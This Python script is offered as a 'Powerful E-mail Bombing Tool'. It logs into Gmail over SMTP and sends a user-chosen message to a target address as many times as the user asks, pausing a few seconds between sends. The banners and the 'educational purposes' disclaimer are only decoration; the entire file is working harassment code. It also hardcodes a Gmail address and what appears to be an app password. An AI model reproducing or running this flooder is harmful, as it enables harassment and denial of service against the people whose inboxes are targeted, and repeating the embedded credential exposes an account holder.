#Email Bombing


# Logo 

import os 
import sys 
import time
import smtplib
import random

os.system("clear")

print("\n\n\n\n")

ab="           \033[1;33mSystem loding...."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n\n\n")

server= smtplib.SMTP("smtp.gmail.com","587")

server.ehlo()
server.starttls()

server.login("alaxhridoy18@gmail.com","hkqhdqjlgwyflonu")


os.system("clear")

time.sleep(2)
print("\n\n")

ab="         \033[1;32mSuccessfully Loaded.!\n"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
name=input("         \033[1;34mName:")

ab="         \033[1;31mHey "+name+", Be Ethical.."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n")


time.sleep(2)

os.system("clear")

print(""" \033[1;31m


   _____  .__                 
  /  _  \\ |  | _____  ___  ___
 /  /_\\  \\|  | \\__  \\ \\  \\/  /
/    |    \\  |__/ __ \\_>    < 
\\____|__  /____(____  /__/\\_ \\
        \\/          \\/      \\/
        

\033[1;33m==============================================
\033[1;32m Owner: Alax Mahmud
 Github: Comming Soon
 Facebook: Alax Hridoy
 \033[3mUse this tools only for educational purposes
\033[1;33m==============================================           
        
        \033[0m

""")

print("""\033[0;35m**********************************************
																										 
	\033[1;37m\n\tPowerful E-mail Bombing Tool\n											 																									 
\033[0;35m**********************************************

""")
to=input("\033[1;33mEnter Your Target E-mail: ")
am=int(input("\033[1;33mEnter Ammount: "))
sub=input("\033[1;33mYour Mail Subject: ")
body=input("\033[1;33mEnter Your Mail Text: ")

msg=(f"Subject:{sub}\n\n{body}")
print("""______________________________________________

""")
sent=0

for i in range(am):
	server.sendmail("alaxhridoy18@gmail.com",to,msg)
	sent+=1
	delay= random.randint(2,5)
	print(f"\033[1;32m\033[1m{sent} Mail Sent Succesfull. Next mail in {delay} seconds..")
	time.sleep(delay)
	

